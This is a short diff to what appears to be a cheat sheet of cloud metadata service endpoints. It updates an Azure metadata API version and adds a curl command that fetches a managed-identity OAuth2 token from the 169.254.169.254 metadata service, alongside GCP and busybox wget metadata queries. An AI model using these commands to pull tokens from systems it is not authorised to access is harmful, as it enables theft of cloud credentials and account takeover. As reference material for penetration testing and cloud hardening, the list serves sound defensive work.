@@ -145,7 +145,8 @@ curl http://metadata.google.internal/computeMetadata/v1/instance/attributes/?rec
 Azure
 
 ```
-curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2017-04-02
+curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2019-08-15
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-15&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
 ```
 
 
@@ -186,6 +187,7 @@ Azure
 
 ```
 busybox wget --header="Metadata: true" http://169.254.169.254/metadata/instance?api-version=2017-04-02
+
 ```
 
 Powershell
